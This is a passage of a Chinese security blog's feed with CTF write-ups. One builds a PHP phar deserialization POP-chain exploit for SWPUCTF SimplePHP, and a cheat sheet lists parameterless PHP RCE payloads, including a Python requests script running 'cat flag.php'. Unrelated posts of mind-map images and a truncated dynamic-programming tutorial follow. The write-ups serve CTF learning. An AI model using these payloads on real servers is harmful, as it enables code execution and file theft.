&#x2F;&#x2F;添加要压缩的文件&#x2F;&#x2F;签名自动计算$phar-&gt;stopBuffering();rename(&#39;phar.phar&#39;,&#39;phar.jpg&#39;);?&gt;</code></pre><p>将生成的<code>phar.jpg</code>上传，再在<code>delete</code>操作时抓包改包，如下，即可成功得到<code>flag</code>，话说为什么是<code>flag.txt</code>我也不知道，一般不是直接<code>flag</code>吗？-.-</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504221851430.png" alt loading="lazy"></p><h4 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h4><p>直接看关键代码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str &#x3D; $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test &#x3D; $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key &#x3D; $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\.\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params &#x3D; array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value &#x3D; $this-&gt;params[$key];        &#125; else &#123;            $value &#x3D; &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text &#x3D; base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt;</code></pre><p><code>_show</code>方法并未过滤phar，题目存在文件上传点和文件包含点，显然想到phar协议的利用</p><p>这题主要需要分析的是pop链，分析以上代码可以知道phar的利用点在<code>file_get_contents</code>函数，而触发<code>file_get_contents</code>函数需要从<code>__get-&gt;get-&gt;file_get-&gt;file_get_contents</code>，简单来讲就是要触发Test类中的<code>__get</code>方法，而<code>__get</code>方法的触发条件是需要对象读取不可访问属性的值，再看到Show类中的<code>__toString</code>方法</p><pre class="language-php" data-language="php"><code class="language-php">public function __toString()&#123;    $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;    return $content;&#125;</code></pre><p>如果令<code>$this-&gt;str[&#39;str&#39;] = new Test()</code>那么不就可以触发Test类中的<code>__get</code>方法了吗</p><p>再想到<code>__toString</code>方法的触发方法，当一个类或对象被当作一个字符串被调用，在C1e4r类中刚好可利用</p><pre class="language-php" data-language="php"><code class="language-php">public function __destruct()&#123;    $this-&gt;test &#x3D; $this-&gt;str;    echo $this-&gt;test;&#125;</code></pre><p>如果令 <code>$this-&gt;str = new Show()</code>即可触发</p><p>于是完整pop链如下：</p><p><code>C1e4r::__destruct -&gt; Show::__toSting -&gt; Test::__get</code></p><p>注意，这里<code>__get</code>方法中的<code>$key</code>的值为触发该方法时传入的不可访问属性的值，</p><p>简而言之就是如果<code>$this-&gt;str[&#39;str&#39;]-&gt;abc   =====&gt;   __get(abc)</code>，而题目中的是固定好的<code>socure</code>，</p><p>所以只需要<code>params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;</code>即可</p><p>exp如下</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$a &#x3D; new C1e4r();$b &#x3D; new Show();$c &#x3D; new Test();$a-&gt;str &#x3D; $b;$b-&gt;str[&#39;str&#39;] &#x3D; $c;$c-&gt;params[&#39;source&#39;] &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&quot;;$phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为 phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置 stub$phar-&gt;setMetadata($a); &#x2F;&#x2F;将自定义的 meta-data 存入 manifest$phar-&gt;addFromString(&quot;poc.php&quot;, &quot;poc&quot;); &#x2F;&#x2F;添加要压缩的文件&#x2F;&#x2F;签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>随后改后缀为jpg再上传，然后找到该文件，利用文件包含读取即可get flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2958#toc-2&quot;&gt;Phar与Stream Wrapper造成PHP RCE的深入挖掘&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/205943.html&quot;&gt;PHAR反序列化拓展操作总结&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://paper.seebug.org/680/&quot;&gt;利用 phar 拓展 php 反序列化漏洞攻击面&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="反序列化" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP无参数RCE</title>
    <link href="https://www.extrader.top/posts/4f9c9406/"/>
    <id>https://www.extrader.top/posts/4f9c9406/</id>
    <published>2020-04-28T10:21:37.000Z</published>
    <updated>2020-08-09T04:24:49.958Z</updated>
    
    <content type="html"><![CDATA[<p>膜膜膜膜膜膜（这东西真的是奇淫技巧）</p><p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>限制条件</strong>：<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)</code></p><a id="more"></a><p><strong>目录下文件</strong>：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429110200063.png" alt loading="lazy"></p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a><strong>测试代码</strong></h4><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;index.php&lt;?phpif(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;        eval($_GET[&#39;code&#39;]);&#125;?&gt;</code></pre><p><code>(?R)</code>引用当前表达式，后面加了<code>?</code>递归调用</p><p>以上正则表达式只匹配<code>a(b(c()))</code>或<code>a()</code>这种格式，不匹配<code>a(&quot;123&quot;)</code>，也就是说我们传入的值函数不能带有参数</p><h4 id="Payload1-getenv"><a href="#Payload1-getenv" class="headerlink" title="Payload1-getenv()"></a>Payload1-getenv()</h4><pre class="language-php" data-language="php"><code class="language-php">var_dump(getenv(phpinfo()));</code></pre><p>可以获取敏感信息</p><ul><li><strong>getenv()</strong>：获取一个环境变量的值，<code>phpinfo()</code>可以获取所有环境变量</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429113257924.png" alt loading="lazy"></p><h4 id="Payload2-getallheaders"><a href="#Payload2-getallheaders" class="headerlink" title="Payload2-getallheaders()"></a><strong>Payload2</strong>-getallheaders()</h4><pre class="language-php" data-language="php"><code class="language-php">eval(end(getallheaders()));</code></pre><p>RCE</p><ul><li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li><li><strong>getallheaders()</strong>：获取全部 HTTP 请求头信息</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429114144142.png" alt loading="lazy"></p><h4 id="Payload3-get-defined-vars"><a href="#Payload3-get-defined-vars" class="headerlink" title="Payload3-get_defined_vars()"></a>Payload3-get_defined_vars()</h4><pre class="language-php" data-language="php"><code class="language-php">eval(end(current(get_defined_vars())));&amp;flag&#x3D;system(&#39;ls&#39;);</code></pre><p>利用全局变量进RCE</p><ul><li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，会返回<code>$_GET,$_POST,$_COOKIE,$_FILES</code>全局变量的值</li><li><strong>current()</strong>：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回<code>$_GET</code>变量的数组值</li><li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。返回数组顺序为<code>get-&gt;post-&gt;cookie-&gt;files</code></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429115651090.png" alt loading="lazy"></p><p>而如果网站对<code>$_GET,$_POST,$_COOKIE</code>都做的过滤， 那我们只能从<code>$_FILES</code>入手了，exp如下：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsdef str2hex(payload):  txt &#x3D; &#39;&#39;  for i in payload:      txt +&#x3D; hex(ord(i))[-2:]  return txtpayload &#x3D; str2hex(&quot;system(&#39;cat flag.php&#39;);&quot;)files &#x3D; &#123;    payload: b&#39;extrader&#39;&#125;r &#x3D; requests.post(&quot;http:&#x2F;&#x2F;192.168.0.107&#x2F;index.php?exp&#x3D;eval(hex2bin(array_rand(end(get_defined_vars()))));&quot;, files&#x3D;files, allow_redirects&#x3D;False)  # allow_redirects&#x3D;False 禁用重定向处理print(r.content.decode())</code></pre><ul><li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个，<code>array_rand()</code>返回随机单元的键名。 否则就返回包含随机键名的数组。</li><li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li><li><strong>hex2bin()</strong>：转换十六进制字符串为二进制字符串</li></ul><p>结果将输出<code>flag.php</code>文件的全部内容，由于空格和点都会被替换成下换线，所以需要用十六进制进行绕过</p><h4 id="Payload4-session-start"><a href="#Payload4-session-start" class="headerlink" title="Payload4-session_start()"></a>Payload4-session_start()</h4><p>文件读取：</p><pre class="language-php" data-language="php"><code class="language-php">show_source(session_id(session_start()));var_dump(file_get_contents(session_id(session_start())))highlight_file(session_id(session_start()));readfile(session_id(session_start()));抓包传入Cookie: PHPSESSID&#x3D;(想读的文件)即可</code></pre><p>RCE：</p><pre class="language-php" data-language="php"><code class="language-php">eval(hex2bin(session_id(session_start())));抓包传入Cookie: PHPSESSID&#x3D;(&quot;system(&#39;命令&#39;)&quot;的十六进制)</code></pre><p>以上的payload好像只适用于<code>php7</code>以下的版本，php7以上的不会显示</p><ul><li><strong>session_start()</strong>：启动新会话或者重用现有会话，成功开始会话返回 <strong><code>TRUE</code></strong> ，反之返回 <strong><code>FALSE</code></strong></li><li><strong>session_id()</strong>：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。</li></ul><h4 id="Payload5-scandir"><a href="#Payload5-scandir" class="headerlink" title="Payload5-scandir()"></a>Payload5-scandir()</h4><p>文件读取：</p><pre class="language-php" data-language="php"><code class="language-php">当前目录：highlight_file(array_rand(array_flip(scandir(getcwd()))));上级目录文件：highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre><ul><li><strong>getcwd()</strong>：取得当前工作目录，成功则返回当前工作目录，失败返回 <strong><code>FALSE</code></strong>。</li><li><strong>dirname()</strong>：返回路径中的目录部分，返回 path 的父目录。 如果在 <code>path</code> 中没有斜线，则返回一个点（’<em>.</em>‘），表示当前目录。否则返回的是把 <code>path</code> 中结尾的 <code>/component</code>（最后一个斜线以及后面部分）去掉之后的字符串(也就是上级目录的文件路径)。</li><li><strong>chdir()</strong>：改变目录，成功时返回 <strong><code>TRUE</code></strong>， 或者在失败时返回 <strong><code>FALSE</code></strong>。</li><li><strong>scandir()</strong>：列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 <strong><code>FALSE</code></strong>。如果 <code>directory</code> 不是个目录，则返回布尔值 <strong><code>FALSE</code></strong> 并生成一条 <strong><code>E_WARNING</code></strong> 级的错误。</li><li><strong>array_flip()</strong>：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 <strong><code>NULL</code></strong>。</li><li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，<strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。</li></ul><p><strong>array_flip()</strong>和<strong>array_rand()</strong>配合使用可随机返回当前目录下的文件名</p><p><strong>dirname(chdir(dirname()))</strong>配合切换文件路径</p><h4 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a><code>.</code>绕过</h4><h5 id="current-localeconv"><a href="#current-localeconv" class="headerlink" title="current(localeconv())"></a><strong>current(localeconv())</strong></h5><ul><li><strong>localeconv()</strong>：返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></li></ul><h5 id="phpversion"><a href="#phpversion" class="headerlink" title="phpversion()"></a><strong>phpversion()</strong></h5><ul><li><code>phpversion()</code>返回php版本，如<code>7.3.5</code></li><li><code>floor(phpversion())</code>返回<code>7</code></li><li><code>sqrt(floor(phpversion()))</code>返回<code>2.6457513110646</code></li><li><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></li><li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></li><li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></li><li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></li><li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>.</code></li><li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li><li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回<code>..</code></li></ul><p><strong>floor()</strong>：舍去法取整，<strong>sqrt()</strong>：平方根，<strong>tan()</strong>：正切值，<strong>cosh()</strong>：双曲余弦，<strong>sinh()</strong>：双曲正弦，<strong>ceil()</strong>：进一法取整</p><h5 id="crypt"><a href="#crypt" class="headerlink" title="crypt()"></a><strong>crypt()</strong></h5><p><code>chr(ord(hebrevc(crypt(phpversion()))))</code>返回<code>.</code></p><ul><li><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</li></ul><p><strong>crypt()</strong>：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。</p><p><strong>hebrevc()</strong>：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p><strong>current()</strong>的别名<strong>pos()</strong></p><p><strong>readgzfile</strong>可以代替<strong>readfile</strong></p><p>目录操作：</p><ul><li><strong>getchwd()</strong> ：函数返回当前工作目录。</li><li><strong>scandir()</strong> ：函数返回指定目录中的文件和目录的数组。</li><li><strong>dirname()</strong> ：函数返回路径中的目录部分。</li><li><strong>chdir()</strong> ：函数改变当前的目录。</li></ul><p>数组相关的操作：</p><ul><li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> ： 将内部指针指向数组中的最后一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> ：将内部指针指向数组中的下一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> ：将内部指针指向数组中的上一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> ： 将内部指针指向数组中的第一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> ： 返回当前元素的键名和键值，并将内部指针向前移动</li></ul><h4 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h4><h5 id="GXYCTF2019—禁止套娃"><a href="#GXYCTF2019—禁止套娃" class="headerlink" title="GXYCTF2019—禁止套娃"></a>GXYCTF2019—禁止套娃</h5><p>扫描目录<code>.git</code>源码泄露，<code>Githack</code>得到<code>index</code>源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#39;exp&#39;]))&#123;    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];                @eval($_GET[&#39;exp&#39;]);            &#125;            else&#123;                die(&quot;还差一点哦！&quot;);            &#125;        &#125;        else&#123;            die(&quot;再好好想想！&quot;);        &#125;    &#125;    else&#123;        die(&quot;还想读flag，臭弟弟！&quot;);    &#125;&#125;&#x2F;&#x2F; highlight_file(__FILE__);?&gt;</code></pre><p>payload1：</p><pre class="language-php" data-language="php"><code class="language-php">highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></pre><p>payload2：</p><pre class="language-php" data-language="php"><code class="language-php">show_source(session_id(session_start()));Cookie: PHPSESSID&#x3D;flag.php</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></li><li><a href="http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html">http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html</a></li><li><a href="https://www.gem-love.com/ctf/530.html?replytocom=5">https://www.gem-love.com/ctf/530.html?replytocom=5</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;膜膜膜膜膜膜（这东西真的是奇淫技巧）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件&lt;/strong&gt;：&lt;code&gt;eval($_GET[&amp;#39;exp&amp;#39;]);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;限制条件&lt;/strong&gt;：&lt;code&gt;preg_replace(&amp;#39;/[^\W]+\((?R)?\)/&amp;#39;, &amp;#39;&amp;#39;, $exp)&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>思维导图收集</title>
    <link href="https://www.extrader.top/posts/6f37048/"/>
    <id>https://www.extrader.top/posts/6f37048/</id>
    <published>2020-04-27T02:56:56.000Z</published>
    <updated>2020-07-14T12:52:02.845Z</updated>
    
    <content type="html"><![CDATA[<h3 id="GIT命令"><a href="#GIT命令" class="headerlink" title="GIT命令"></a>GIT命令</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/git命令.jpg" alt="git命令" style="zoom: 25%;" loading="lazy"><h3 id="网络安全绪论"><a href="#网络安全绪论" class="headerlink" title="网络安全绪论"></a>网络安全绪论</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络安全绪论.jpg" alt="网络安全绪论" style="zoom:25%;" loading="lazy"><h3 id="网络安全发展与未来"><a href="#网络安全发展与未来" class="headerlink" title="网络安全发展与未来"></a>网络安全发展与未来</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络安全发展与未来.jpg" alt="网络安全发展与未来" style="zoom:25%;" loading="lazy"><h3 id="Web攻击及防御技术"><a href="#Web攻击及防御技术" class="headerlink" title="Web攻击及防御技术"></a>Web攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/Web攻击及防御技术.jpg" alt="Web攻击及防御技术" style="zoom:25%;" loading="lazy"><h3 id="网络监听及防御技术"><a href="#网络监听及防御技术" class="headerlink" title="网络监听及防御技术"></a>网络监听及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络监听及防御技术.jpg" alt="网络监听及防御技术" style="zoom:25%;" loading="lazy"><h3 id="扫描与防御技术"><a href="#扫描与防御技术" class="headerlink" title="扫描与防御技术"></a>扫描与防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/扫描与防御技术.jpg" alt="扫描与防御技术" style="zoom:25%;" loading="lazy"><h3 id="欺骗攻击及防御技术"><a href="#欺骗攻击及防御技术" class="headerlink" title="欺骗攻击及防御技术"></a>欺骗攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/欺骗攻击及防御技术.jpg" alt="欺骗攻击及防御技术" style="zoom:25%;" loading="lazy"><h3 id="木马攻击及防御技术"><a href="#木马攻击及防御技术" class="headerlink" title="木马攻击及防御技术"></a>木马攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/木马攻击及防御技术.jpg" alt="木马攻击及防御技术" style="zoom:25%;" loading="lazy"><h3 id="口令破解与防御技术"><a href="#口令破解与防御技术" class="headerlink" title="口令破解与防御技术"></a>口令破解与防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/口令破解与防御技术.jpg" alt="口令破解与防御技术" style="zoom:25%;" loading="lazy"><h3 id="拒绝服务供给与防御技术"><a href="#拒绝服务供给与防御技术" class="headerlink" title="拒绝服务供给与防御技术"></a>拒绝服务供给与防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/拒绝服务供给与防御技术.png" alt="拒绝服务供给与防御技术" style="zoom:25%;" loading="lazy"><h3 id="缓冲区溢出攻击及防御技术"><a href="#缓冲区溢出攻击及防御技术" class="headerlink" title="缓冲区溢出攻击及防御技术"></a>缓冲区溢出攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/缓冲区溢出攻击及防御技术.jpg" alt="缓冲区溢出攻击及防御技术" style="zoom:25%;" loading="lazy"><h3 id="计算机病毒"><a href="#计算机病毒" class="headerlink" title="计算机病毒"></a>计算机病毒</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/计算机病毒.jpg" alt="计算机病毒" style="zoom:25%;" loading="lazy"><h3 id="网络攻击链手段防护产品"><a href="#网络攻击链手段防护产品" class="headerlink" title="网络攻击链手段防护产品"></a>网络攻击链手段防护产品</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络攻击链手段防护产品.png" alt="网络攻击链手段防护产品" style="zoom:10%;" loading="lazy"><h3 id="nginx源码分析全景图"><a href="#nginx源码分析全景图" class="headerlink" title="nginx源码分析全景图"></a>nginx源码分析全景图</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/nginx源码分析全景图.png" alt="nginx源码分析全景图" style="zoom:6%;" loading="lazy"><p>另外在P神的github上也有些：<a href="https://github.com/phith0n/Mind-Map">https://github.com/phith0n/Mind-Map</a></p><ul><li>图片均来自网络，侵删</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;GIT命令&quot;&gt;&lt;a href=&quot;#GIT命令&quot; class=&quot;headerlink&quot; title=&quot;GIT命令&quot;&gt;&lt;/a&gt;GIT命令&lt;/h3&gt;&lt;img src=&quot;https://gitee.com/Extrader/blogimage/raw/master/ima
      
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="思维导图" scheme="https://www.extrader.top/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    
  </entry>
  
  <entry>
    <title>算法-动态规划</title>
    <link href="https://www.extrader.top/posts/e57c001c/"/>
    <id>https://www.extrader.top/posts/e57c001c/</id>
    <published>2020-04-21T09:23:34.000Z</published>
    <updated>2020-07-14T12:52:02.869Z</updated>
    
    <content type="html"><![CDATA[<h3 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h3><p><code>1,1,2,3,5,8,13...</code>，状态转移方程：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190059738.png" alt loading="lazy"></p><a id="more"></a><h4 id="暴力递归"><a href="#暴力递归" class="headerlink" title="暴力递归"></a><strong>暴力递归</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def main(a):    if a &#x3D;&#x3D; 1 or a &#x3D;&#x3D; 2:        return 1    return main(a-1) + main(a-2)</code></pre><p>时间复杂度为<code>O(2^n)</code>，有如下递归树：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190828749.png" alt loading="lazy"></p><p>我们可以看到许多的计算都重复了，例如下面的<code>f(18)</code>等，那么如何避免这个问题呢？有效的方法就是将第一次计算出的<code>f(18)</code>的结果保留下来，如果下次再计算到这个<code>f(18)</code>的时候直接将结果取出来即可，简称备忘录方法，如下：</p><h4 id="带备忘录的递归解法"><a href="#带备忘录的递归解法" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python">memo &#x3D; dict()def main(a):    if a &#x3D;&#x3D; 1 or a &#x3D;&#x3D; 2:        return 1    if a in memo:        return memo[a]    memo[a] &#x3D; main(a-1) + main(a-2)    return main(a-1) + main(a-2)</code></pre><h4 id="DP-table解法"><a href="#DP-table解法" class="headerlink" title="DP table解法"></a><strong>DP table解法</strong></h4><p>自底向上优化</p><pre class="language-python" data-language="python"><code class="language-python">dp &#x3D; []def main(a):    if a &#x3D;&#x3D; 1 or a &#x3D;&#x3D; 2:        return 1    dp.append(1)    dp.append(1)    for i in range(2, a):        dp.append(dp[i - 1] + dp[i - 2])    return dp[a-1]</code></pre><p>原理图如下(emmmmm，图是搬运过来的，所以前面的第0位还是用到了的，往前移一位就行了)</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190143099.png" alt loading="lazy"></p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>再进行空间复杂度的优化</p><pre class="language-python" data-language="python"><code class="language-python">def main(a):    if a &#x3D;&#x3D; 1 or a &#x3D;&#x3D; 2:        return 1    prev &#x3D; 1    curr &#x3D; 1    for i in range(3, a + 1):        num &#x3D; prev + curr        prev &#x3D; curr        curr &#x3D; num    return curr</code></pre><p>由原来的时间复杂度<code>O(2^n)</code>变为了<code>O(n)</code>，空间复杂度降为<code>O(1)</code></p><h3 id="凑零钱问题"><a href="#凑零钱问题" class="headerlink" title="凑零钱问题"></a>凑零钱问题</h3><p>假设给你<code>k</code>中面值的硬币，面值分别为<code>c1，c2，c3 ... ck</code>，每种硬币的数量无限，再给一个总金额<code>amount</code>，问<strong>最少</strong>需要几枚硬币凑出这个金额，如果不可能凑出，则返回-1</p><p>状态转移方程：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185311310.png" alt loading="lazy"></p><h4 id="暴力递归-1"><a href="#暴力递归-1" class="headerlink" title="暴力递归"></a><strong>暴力递归</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def coinChange(coins, amount):    def main(n):        if n &#x3D;&#x3D; 0:  # 当n - coin &#x3D; 0 的时候说明这条路走的通            return 0        if n &lt; 0:  # 当n - coin &lt; 0 